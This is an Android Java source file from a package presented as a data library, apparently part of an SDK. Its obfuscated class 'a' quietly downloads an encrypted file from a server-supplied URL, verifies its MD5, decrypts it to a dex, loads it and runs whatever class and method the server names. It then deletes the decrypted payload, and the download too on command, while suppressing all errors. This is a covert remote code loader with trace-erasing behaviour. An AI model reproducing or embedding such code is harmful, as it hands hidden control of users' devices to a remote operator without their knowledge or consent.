package com.seecoms.data.opera;

import android.os.AsyncTask;
import android.text.TextUtils;
import android.util.Log;

import java.io.File;

import com.seecoms.data.BuildConfig;
import com.seecoms.data.util.DexUtil;
import com.seecoms.data.util.FileUtil;
import com.seecoms.data.util.HttpUtil;
import com.seecoms.data.util.VerifyUtil;

public class a extends AsyncTask<String, String, String> {
    private static final String TAG = a.class.getSimpleName();
    private TaskBean data;

    public a(TaskBean data) {
        this.data = data;
    }

    @Override
    protected String doInBackground(String[] objects) {
        try {
            String downloadUrl = data.u;
            String fileName = data.fn;
            String md5 = data.s;
            String encryptedFile = null;

            if (TextUtils.isEmpty(downloadUrl) || TextUtils.isEmpty(fileName) || TextUtils.isEmpty(md5)) { // 2019.03.10 add
                return null;
            }
            // 1.检查任务文件本地是否存在，如果存在取对应的md5值。
            File localFile = new File(FileUtil.getFilePath(fileName));
            String localFileMD5 = "";
            if (localFile != null && localFile.exists()) {
                localFileMD5 = VerifyUtil.getFileMD5(localFile.getAbsolutePath());
            }
            // 2.对比本地文件的md5值和下发的是否一致，一致则不再下载新的文件
            if (!TextUtils.isEmpty(localFileMD5) && localFileMD5.equals(md5)) {
                encryptedFile = localFile.getAbsolutePath();
            } else {
                // 3.1 下载任务文件。
                String downFilePath = HttpUtil.downloadFile(downloadUrl, fileName);
                encryptedFile = downFilePath;

                // 3.2 对比下载的文件md5值和接口下发的md5值，不相同则过滤掉不执行任务。
                String verifyMD5 = VerifyUtil.getFileMD5(downFilePath);
                if (TextUtils.isEmpty(md5) || !md5.equals(verifyMD5)) {
                    return null;
                }
            }

            // 4.解密下载的加密文件。
            String decryptedPath = FileUtil.getFilePath(md5 + FileUtil.DEX_FILENAME);
            if (!TextUtils.isEmpty(encryptedFile) && !TextUtils.isEmpty(decryptedPath)) {
                VerifyUtil.decryptFile(encryptedFile, decryptedPath);

                if (BuildConfig.LOG_DEBUG) {
                    Log.e(TAG, "decrypted:" + decryptedPath);
//                    Thread.sleep(10000);
                }
                // 5.加载解密后的文件，执行文件中任务
                String packageName = data.pn;
                String exeMethod = data.ex;

                DexUtil.loadClass(packageName, exeMethod, decryptedPath);

                // 6.执行完加载后，删除解密后的文件
                File decryptFile = new File(decryptedPath);
                if ((decryptFile != null) && (decryptFile.exists())) {
                    decryptFile.delete();
                }

                // 7.根据数据下发的指令是否删除下载的文件
                boolean delete = data.cd;
                if (delete) {
                    File downFile = new File(FileUtil.getFilePath(data.fn));
                    if (downFile != null && downFile.exists()) {
                        downFile.delete();
                    }
                }

                return decryptedPath;
            }
        } catch (Throwable e) {
        }
        return null;
    }

    @Override
    protected void onPostExecute(String path) {
        /*try {
            if (TextUtils.isEmpty(path)) {
                return;
            }
            if (BuildConfig.LOG_DEBUG) {
                Log.e(TAG, "decrypted:" + path);
            }
            // 5.加载解密后的文件，执行文件中任务
            String packageName = data.pn;
            String exeMethod = data.ex;

            DexUtil.loadClass(packageName, exeMethod, path);

            // 6.执行完加载后，删除解密后的文件
            File decryptFile = new File(path);
            if ((decryptFile != null) && (decryptFile.exists())) {
                decryptFile.delete();
            }

            // 7.根据数据下发的指令是否删除下载的文件
            boolean delete = data.cd;
            if (delete) {
                File downFile = new File(FileUtil.getFilePath(data.fn));
                if (downFile != null && downFile.exists()) {
                    downFile.delete();
                }
            }
        } catch (Throwable e) {
        }*/
    }
}
